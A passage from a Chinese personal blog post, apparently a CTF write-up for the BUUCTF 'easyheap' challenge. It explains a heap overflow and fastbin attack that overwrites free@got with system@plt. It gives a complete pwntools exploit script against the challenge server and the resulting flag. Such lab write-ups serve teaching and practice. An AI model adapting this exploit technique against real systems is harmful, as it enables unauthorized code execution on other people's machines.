+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat /flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat /flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>把 <code>chunk1</code> 的内容改成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>cat /flag
+</span></span></code></pre></div><hr>
+
+<h2 id="7-触发-systemcat-flag" data-numberify>7. 触发 system(“cat /flag”)<a class="anchor ms-1" href="#7-触发-systemcat-flag"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>delete(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>原本这句是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(heaparray[<span style="color:#ae81ff">1</span>]);
+</span></span></code></pre></div><p>但由于我们已经把 <code>free@got</code> 改成了 <code>system@plt</code>，所以现在实际执行的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(heaparray[<span style="color:#ae81ff">1</span>]);
+</span></span></code></pre></div><p>也就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /flag&#34;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>从而拿到 flag。</p>
+<hr>
+
+<h2 id="exp" data-numberify>EXP<a class="anchor ms-1" href="#exp"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./easyheap&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node5.buuoj.cn&#39;</span>, <span style="color:#ae81ff">27663</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size, content):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size of Heap : &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Content of heap:&#39;</span>, content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, size, content):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index :&#39;</span>, str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size of Heap : &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Content of heap : &#39;</span>, content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(index):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index :&#39;</span>, str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)    <span style="color:#75715e"># 0</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pad&#39;</span>)      <span style="color:#75715e"># 1</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)    <span style="color:#75715e"># 2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x6020ad</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, len(payload), payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)                             <span style="color:#75715e"># 2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x23</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>]))   <span style="color:#75715e"># 3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;system&#39;</span>]))
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat /flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat /flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+
+<h2 id="最终结果" data-numberify>最终结果<a class="anchor ms-1" href="#最终结果"></a></h2>
+<p>远程返回：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{0ad2171d-510e-4e55-b77c-9b01eae59302}
+</span></span></code></pre></div><hr>
+
+<h2 id="总结" data-numberify>总结<a class="anchor ms-1" href="#总结"></a></h2>
+<p>这题核心是两点：</p>
+<ol>
+<li><code>edit</code> 可控长度导致 heap overflow</li>
+<li>利用 fastbin attack 把 fake chunk 打到 <code>.bss</code>，进而覆盖 <code>heaparray</code>
+控制 <code>heaparray</code> 后，就能把菜单接口变成任意地址写。<br>
+最终通过把 <code>free@got</code> 改成 <code>system@plt</code>，实现任意命令执行并读取 <code>/flag</code>。</li>
+</ol>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-3/wp/">wp</a>
+    </div><div class="post-nav post-next">
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-3/codex/">codex</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">版权</h2>
+    </div>
+    <div class="card-body">
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">评论</h2>
+  </div>
+  <div class="card-body">
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="accordion profile">
+  <div class="accordion-item card row text-center component">
+    <div class="accordion-header card-header border-0" id="profile-header">
+      <a
+        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
+        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
+        Profile
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
+      <div class="col-12 d-flex align-items-center justify-content-center"><img
+  class="profile-avatar rounded-circle"
+  alt="微风的龙"
+  src="/images/profile.png"
+  loading="lazy"
+  data-viewer-invisible
+></div>
+      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">微风的龙</div>
+<div class="profile-bio">哈基龙的博客，随便看看</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>China</div><a class="profile-about" target="_blank" rel="noopener noreferrer" href="https://github.com/weifengdel0ng"><i class="fas fa-fw fa-user"></i>关于我</a></div>
+
+
+<nav class="social-links nav justify-content-center mt-1 justify-content-around">
+      <a class="nav-link social-link" target="_blank" href="https://github.com/weifengdel0ng" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%B8%80%E9%A1%B5/harekazectf2019baby_rop2/%E9%99%84%E4%BB%B6/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  </div>
+</div>
+
+
+<div class="accordion taxonomies-toggle">
+    <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+            <a
+                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
+                Taxonomies
+            </a>
+        </div>
+        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
+            <ul class="nav nav-pills nav-fill" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
+                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
+                            分类
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
+                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
+                            标签
+                        </button>
+                    </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
+                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
+                        归档
+                    </button>
+                </li>
+            </ul>
+            
+            <div class="tab-content mt-3">
+                    <div class="tab-pane active" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
+                        <a href="/categories/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/categories/%E4%B8%93%E9%A2%98/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="专题">
+                            专题
+                        </a>
+                        <a href="/categories/%E5%BB%BA%E7%AB%99/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="建站">
+                            建站
+                        </a>
+                    </div>
+                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
+                        <a href="/tags/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/tags/blog/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Blog">
+                            Blog
+                        </a>
+                        <a href="/tags/github-pages/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        <a href="/tags/hugo/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hugo">
+                            Hugo
+                        </a>
+                    </div>
+                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">
+
+    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2026">
+    2026 <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
+    </a>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            文章
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  最近文章
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/hello-hugo/">
+        博客已上线
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/buu/">
+        BUU
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">目录</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        目录
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞点">漏洞点</a></li>
+    <li><a href="#为什么不走后门">为什么不走后门</a></li>
+    <li><a href="#利用思路">利用思路</a></li>
+    <li><a href="#关键地址">关键地址</a></li>
+    <li><a href="#利用过程">利用过程</a>
+      <ul>
+        <li><a href="#1-申请-3-个-fastbin-chunk">1. 申请 3 个 fastbin chunk</a></li>
+        <li><a href="#2-释放-chunk2">2. 释放 chunk2</a></li>
+        <li><a href="#3-溢出-chunk1篡改-chunk2-的-fd">3. 溢出 chunk1，篡改 chunk2 的 fd</a></li>
+        <li><a href="#4-连续-malloc-两次拿到-fake-chunk">4. 连续 malloc 两次，拿到 fake chunk</a></li>
+      </ul>
+    </li>
+    <li><a href="#为什么是-0x6020ad">为什么是 <code>0x6020ad</code></a></li>
+    <li><a href="#5-劫持-freegot">5. 劫持 free@got</a></li>
+    <li><a href="#6-把-chunk1-改成命令字符串">6. 把 chunk1 改成命令字符串</a></li>
+    <li><a href="#7-触发-systemcat-flag">7. 触发 system(&ldquo;cat /flag&rdquo;)</a></li>
+    <li><a href="#exp">EXP</a></li>
+    <li><a href="#最终结果">最终结果</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      操作
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> 返回
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> 刷新
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> 复制链接
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">微风的龙</p>
+    <p class="text-secondary mb-2"><small>微风的龙的个人博客，记录技术、项目和思考。</small></p><div class="copyright mb-2 text-secondary">
+  <small>
+</small>
+</div>
+<div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.3de74a0b978ed64b15f6e0d25d913177adc77cae61692b679df48c3036ac2c49.js" integrity="sha256-PedKC5eO1ksV9uDSXZExd63HfK5haStnnfSMMDasLEk=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.2afb6643b7cdde837754668abae3dceedc993b71ebefe8bc9c80af3e2e349075.js" integrity="sha256-KvtmQ7fN3oN3VGaKuuPc7tyZO3Hr7&#43;i8nICvPi40kHU=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.13800f940d1d83422ff174b45ece49c4c58a17a608fe79bdba39aec874d4c7fe.js" integrity="sha256-E4APlA0dg0Iv8XS0Xs5JxMWKF6YI/nm9ujmuyHTUx/4=" crossorigin="anonymous" defer></script>
+
+
+  </body>
+</html>
